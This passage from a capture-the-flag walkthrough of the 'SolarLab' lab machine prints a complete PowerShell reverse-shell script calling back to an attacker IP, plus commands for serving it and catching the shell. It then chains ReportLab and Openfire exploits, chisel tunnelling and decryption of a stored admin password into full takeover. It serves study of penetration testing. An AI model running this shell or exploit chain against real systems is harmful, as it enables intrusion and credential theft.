This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.95 -Port 443
```

Now I will start the http server to share this file:

```bash
❯ ls
shell.ps1
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

And a nc listener to receive the shell:

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

In conclusion, the attack chain will be:

```plaintext
report page uses ReportLab pdf library -> exploit CVE-2023-33733 -> execute command to interpret the powershell script from attacker's http server -> reverse shell on port 443 of attacker
```

The only thing left is to insert the html in the justification field to trigger the vulnerability. However, it says "character limit exceeded":

![](/assets/images/Solarlab/Pasted%20image%2020240921114440.png)

![](/assets/images/Solarlab/Pasted%20image%2020240921114503.png)

But then I remembered that other fields were reflected in the pdf so what if some field doesn't have this check? I tried on the time_interval field and I finally receive the shell as blake:

![](/assets/images/Solarlab/Pasted%20image%2020240921114715.png)

![](/assets/images/Solarlab/Pasted%20image%2020240921114745.png)

And the user.txt flag is available in blake's Desktop:

```powershell
PS C:\Users\blake\Desktop> type user.txt
b5****************************d9
```

# Access as administrator

Looking for listening ports, I can see some ports that are related to [xmpp server](https://xmpp.org/) which is a software for messaging:

```powershell
PS C:\Users\blake> netstat -ano | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5724
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       912
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       6016
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:6791           0.0.0.0:0              LISTENING       5724
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       688
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       536
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1072
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1672
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       668
  TCP    10.10.11.16:139        0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:5000         0.0.0.0:0              LISTENING       2348
  TCP    127.0.0.1:5222         0.0.0.0:0              LISTENING       3160
  TCP    127.0.0.1:5223         0.0.0.0:0              LISTENING       3160
  TCP    127.0.0.1:5262         0.0.0.0:0              LISTENING       3160
  TCP    127.0.0.1:5263         0.0.0.0:0              LISTENING       3160
  TCP    127.0.0.1:5269         0.0.0.0:0              LISTENING       3160
  TCP    127.0.0.1:5270         0.0.0.0:0              LISTENING       3160
  TCP    127.0.0.1:5275         0.0.0.0:0              LISTENING       3160
  TCP    127.0.0.1:5276         0.0.0.0:0              LISTENING       3160
  TCP    127.0.0.1:7070         0.0.0.0:0              LISTENING       3160
  TCP    127.0.0.1:7443         0.0.0.0:0              LISTENING       3160
  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3160
  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3160
  TCP    [::]:135               [::]:0                 LISTENING       912
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       688
  TCP    [::]:49665             [::]:0                 LISTENING       536
  TCP    [::]:49666             [::]:0                 LISTENING       1072
  TCP    [::]:49667             [::]:0                 LISTENING       1672
  TCP    [::]:49668             [::]:0                 LISTENING       668
```

I will download chisel and forward all the ports that are not related to xmpp and aren't visible externally (5040, 5000, 7070, 7443, 9090, 9091, 5985). If I don't find nothing interesting, I will look for xmpp ports:

```bash
❯ ./chisel_linux server -p 1234 --reverse
2024/09/21 12:22:33 server: Reverse tunnelling enabled
2024/09/21 12:22:33 server: Fingerprint 2XjrlLyYw7dYEkmD4vDUm9qGPQLDk4kI0vlY/LjSvxU=
2024/09/21 12:22:33 server: Listening on http://0.0.0.0:1234
```

```powershell
PS C:\Windows\Temp\privesc> curl.exe http://10.10.15.95/chisel_windows.exe -o chisel.exe
PS C:\Windows\Temp\privesc> .\chisel.exe client 10.10.15.95:1234 R:5040:127.0.0.1:5040 R:5000:127.0.0.1:5000 R:7070:127.0.0.1:7070 R:7443:127.0.0.1:7443 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091 R:5985:127.0.0.1:5985
```

> Note: To make the command more easy I executed `for port in "5040" "5000" "7070" "7443" "9090" "9091" "5985"; do echo -n "R:$port:127.0.0.1:$port ";done;echo` to have the part of the command that forward the ports.

The port 9090 consists on a openfire administration console version 4.7.4:
![](/assets/images/Solarlab/Pasted%20image%2020240921122947.png)

Searching for vulnerabilities, I saw [this one](https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce) that consists on a lfi that I can use to create an admin user and have rce via plugin upload. I will reproduce the vulnerability.

First, I need to have the csrf token and cookie:
![](/assets/images/Solarlab/Pasted%20image%2020240921123708.png)

Then, with those cookies, I can create an admin user using `user-create.jsp`:

![](/assets/images/Solarlab/Pasted%20image%2020240921124154.png)

Now, I can login with username test and password `admin`:

![](/assets/images/Solarlab/Pasted%20image%2020240921124223.png)

With access to the dashboard, I can upload a plugin. The plugin that offers the poc is [here](https://github.com/miko550/CVE-2023-32315/blob/main/openfire-management-tool-plugin.jar), which I will download it to my machine and then in "Plugins", I will upload it:

![](/assets/images/Solarlab/Pasted%20image%2020240921124454.png)

Going to Server Settings > Management Tool, asks for a password, which as said in the PoC, is 123:

![](/assets/images/Solarlab/Pasted%20image%2020240921124605.png)

![](/assets/images/Solarlab/Pasted%20image%2020240921124612.png)

I will enter it and I have access to the malicious plugin:

![](/assets/images/Solarlab/Pasted%20image%2020240921124630.png)

Selecting "system command", I'm able to execute a command. Executing `whoami`, I can see that I'm the user openfire:

![](/assets/images/Solarlab/Pasted%20image%2020240921124724.png)

I will gain access the same as before with the powershell encoded command:

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

![](/assets/images/Solarlab/Pasted%20image%2020240921124822.png)

And now I have access as openfire:

![](/assets/images/Solarlab/Pasted%20image%2020240921124842.png)

# Access as administrator

Taking in advantage that I have access as openfire, I can look at the openfire script to initialize the database and some encryption for the Administrator password is there:

```powershell
PS C:\Program Files\Openfire\embedded-db> type openfire.script | findstr INSERT | findstr OFUSER
INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')
INSERT INTO OFUSERPROP VALUES('admin','console.rows_per_page','/session-summary.jsp=25')
```

Searching in google on how to decrypt it, I stumble upon [this](https://github.com/jas502n/OpenFire_Decrypt/) github that gives the code to decrypt the password. I will clone it and execute it:

```bash
❯ git clone https://github.com/jas502n/OpenFire_Decrypt
Cloning into 'OpenFire_Decrypt'...
remote: Enumerating objects: 69, done.
remote: Counting objects: 100% (69/69), done.
remote: Compressing objects: 100% (63/63), done.
remote: Total 69 (delta 21), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (69/69), 1.19 MiB | 3.33 MiB/s, done.
Resolving deltas: 100% (21/21), done.
❯ cd OpenFire_Decrypt
```

To decrypt it I have to follow the steps described in the poc:

![](/assets/images/Solarlab/Pasted%20image%2020240921144054.png)

Then, I followed the steps from [here](https://www.digitalocean.com/community/tutorials/install-maven-linux-ubuntu) to install mvn and now I can run the tool:

```bash
PS C:\Program Files\Openfire\embedded-db> type openfire.script | findstr INSERT | findstr OFUSER
INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')
INSERT INTO OFUSERPROP VALUES('admin','console.rows_per_page','/session-summary.jsp=25')
PS C:\Program Files\Openfire\embedded-db> type openfire.script | findstr OFPROPERTY | findstr passwordKey
INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)
PS C:\Program Files\Openfire\embedded-db> 
```

```bash
❯ cd OpenFire_Decrypt
❯ mvn clean package -DskipTests
❯ java -jar target/OpenFire-1.0-SNAPSHOT-jar-with-dependencies.jar
__________________________________________
OpenFire 管理后台账号密码解密
encryptedPassword =>> 后台用户的密码
passwordKey =>> 安装生成的秘钥

[+] encryptedPassword= becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442
[+] passwordKey= hGXiFzsKaAeYLjn
[+] Password =>> ThisPasswordShouldDo!@
```

The password is 'ThisPasswordShouldDo!@'. Let's see if it works for administrator in the system using winrm port I forwarded before with chisel:

```bash
❯ netexec winrm localhost -u Administrator -p 'ThisPasswordShouldDo!@'
WINRM       127.0.0.1       5985   SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 (name:SOLARLAB) (domain:solarlab)
WINRM       127.0.0.1       5985   SOLARLAB         [+] solarlab\Administrator:ThisPasswordShouldDo!@ (Pwn3d!)
```

It works! Now I can gain access as administrator using evil-winrm:

```bash
❯ evil-winrm -i localhost -u Administrator -p 'ThisPasswordShouldDo!@'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

And root.txt flag is available in Administrator's Desktop:

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
8f****************************ac
```

That's the machine. Hope you liked it!


{% endraw %}
